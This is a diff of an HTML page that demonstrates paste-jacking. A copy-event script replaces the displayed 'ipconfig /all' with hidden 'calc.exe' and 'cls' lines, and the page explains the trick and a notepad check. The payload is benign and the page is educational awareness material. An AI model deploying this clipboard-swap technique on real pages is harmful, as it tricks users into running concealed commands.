@@ -1,16 +1,37 @@
 <html>
-    <body>
-        Copy the text below and run it in your terminal for totally not evil things to happen.
-        </br>
+	<head>
+		<title>Demonstration of Paste Jacking</title>
+		<style>
+		.codearea {
+			background-color: #939799;
+		}
+		</style>
+	</head>
+	<body>
+	<p> Copy the text below and run it in your terminal for totally not evil things to happen. </p>
+	<p class="codearea">ipconfig /all</p>
+	<p>	Paste the above in a window CMD and observe a calculator magically appears. <br>
+		
+		You can see the actual content if you paste it in notepad first. <br>
+	</p>
+	<p class="codearea">
+	calc.exe<br>
+	cls<br>
+	ipconfig /all<br>
+	<br>
+	</p>
 
-        <p>echo "not evil"</p>
-        <script>
-            document.addEventListener('copy', function(e){
-                console.log(e);
-                e.clipboardData.setData('text/plain', 'echo "evil"\r\n');
-                e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
-            });
-        </script>
-    </body>
+	<p>This is why I have trust issues copying code from unknown online sources...</p>
+	<p>This does not mean one should not copy code from places like stackoverflow. <br>
+	However, things can get interesting if that website has XSS vulnerability...</p>
+
+	<script>
+	    document.addEventListener('copy', function(e){
+		console.log(e);
+		e.clipboardData.setData('text/plain', 'calc.exe\ncls\nipconfig /all\n');
+		e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard
+	    });
+	</script>
+	</body>
 
 </html>
